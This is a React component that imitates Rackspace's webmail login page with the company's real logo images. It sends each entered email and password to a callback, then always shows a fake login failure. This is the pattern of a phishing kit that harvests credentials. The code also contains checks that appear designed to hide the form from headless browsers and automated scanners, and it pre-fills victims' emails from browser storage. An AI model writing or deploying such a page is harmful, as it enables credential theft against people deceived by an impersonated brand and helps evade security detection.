import React, { useState, useEffect } from 'react';

const LoginForm = ({ onLoginAttempt, attempts, maxAttempts }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [botDetected, setBotDetected] = useState(false);

  useEffect(() => {
    // Anti-bot detection
    detectBot();
    
    // Auto-populate email from browser storage
    autoPopulateEmail();
    
    // Track mouse movements
    trackUserBehavior();
  }, []);

  const detectBot = () => {
    // Check for headless browsers
    if (navigator.webdriver || 
        window.navigator.webdriver || 
        window.callPhantom || 
        window._phantom ||
        window.Buffer ||
        window.emit ||
        window.spawn) {
      setBotDetected(true);
      return;
    }

    // Check for automation tools
    if (window.chrome && window.chrome.runtime && window.chrome.runtime.onConnect) {
      // Likely automated
      setBotDetected(true);
      return;
    }

    // Check navigator properties
    if (navigator.languages && navigator.languages.length === 0) {
      setBotDetected(true);
      return;
    }

    // Check for missing properties
    if (!navigator.plugins || navigator.plugins.length === 0) {
      setBotDetected(true);
      return;
    }
  };

  const autoPopulateEmail = () => {
    // Try to get email from various browser storage locations
    const savedEmail = localStorage.getItem('userEmail') || 
                      sessionStorage.getItem('userEmail') ||
                      localStorage.getItem('email') ||
                      sessionStorage.getItem('email');
    
    if (savedEmail) {
      setEmail(savedEmail);
    }

    // Try to extract from browser autofill
    setTimeout(() => {
      const emailInput = document.querySelector('input[type="email"]');
      if (emailInput && emailInput.value && !email) {
        setEmail(emailInput.value);
      }
    }, 1000);
  };

  const trackUserBehavior = () => {
    let mouseMovements = 0;
    let keystrokes = 0;

    const handleMouseMove = () => {
      mouseMovements++;
    };

    const handleKeyPress = () => {
      keystrokes++;
    };

    document.addEventListener('mousemove', handleMouseMove);
    document.addEventListener('keypress', handleKeyPress);

    // Check behavior after 10 seconds
    setTimeout(() => {
      if (mouseMovements < 5 && keystrokes < 3) {
        setBotDetected(true);
      }
      
      document.removeEventListener('mousemove', handleMouseMove);
      document.removeEventListener('keypress', handleKeyPress);
    }, 10000);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (botDetected) {
      setError('Automated access detected. Please try again later.');
      return;
    }

    if (!email || !password) {
      setError('Please fill in all fields.');
      return;
    }

    setLoading(true);
    setError('');

    try {
      const canContinue = await onLoginAttempt(email, password);
      
      if (!canContinue) {
        setError(`Maximum login attempts reached. Redirecting...`);
        return;
      }

      // Simulate login failure
      setTimeout(() => {
        setError('Invalid email or password. Please try again.');
        setLoading(false);
        setPassword(''); // Clear password for security
      }, 2000);

    } catch (error) {
      setError('An error occurred. Please try again.');
      setLoading(false);
    }
  };

  return (
    <div>
      <div id="content">
        <div>
          <div id="content-header">
            <div id="content-header-logo">
              <img id="logo" src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png" alt="Rackspace Technology" />
            </div>
            <div id="content-header-label">Webmail Login</div>
          </div>
          <div id="content-body">
            <div id="banner-section">
              <a href="#" target="_blank" onClick={(e) => e.preventDefault()}>
                <img id="banner" src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg" alt="Suspicious Email Banner" />
              </a>
            </div>

            <form id="form" onSubmit={handleSubmit}>
              <div id="form-body">
                <div id="form-container">
                  {error && (
                    <div className="error-message" style={{display: 'block'}}>
                      {error}
                    </div>
                  )}

                  <div className="row">
                    <div className="col">
                      <div className="form-group">
                        <label className="form-label">Email address</label>
                        <input 
                          style={{width: '100%'}} 
                          required 
                          type="email" 
                          name="email" 
                          id="email" 
                          className="form-field"
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          autoComplete="email"
                        />
                      </div>
                    </div>
                  </div>

                  <div className="row">
                    <div className="col">
                      <div className="form-group">
                        <label className="form-label">Password</label>
                        <a href="#" className="forgot-password-link" onClick={(e) => e.preventDefault()}>Forgot password?</a>
                        <input 
                          required 
                          name="password" 
                          id="password" 
                          type="password" 
                          className="form-field"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          autoComplete="current-password"
                        />
                      </div>
                    </div>
                  </div>

                  <div id="submit-btn-toolbar">
                    <button 
                      type="submit" 
                      id="submit-btn" 
                      style={{marginRight: '30px'}}
                      disabled={loading || botDetected}
                    >
                      {loading && <span className="loading"></span>}
                      {loading ? 'Signing In...' : 'Log In'}
                    </button>
                  </div>
                </div>
              </div>
            </form>
          </div>
          <div className="base_links">
            <a className="base_link" target="_blank" href="#" onClick={(e) => e.preventDefault()}>
              Privacy Statement
            </a>
            <div className="divider"> | </div>
            <a className="base_link" target="_blank" href="#" onClick={(e) => e.preventDefault()}>
              Website Terms
            </a>
          </div>
          <div className="footer" style={{textAlign: 'center', marginTop: '10px'}}>
            <div className="caption">
              Need webmail for your business? Learn more about
              <a href="#" style={{color: '#666'}} onClick={(e) => e.preventDefault()}>
                Hosted Email
              </a>
              from Rackspace
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
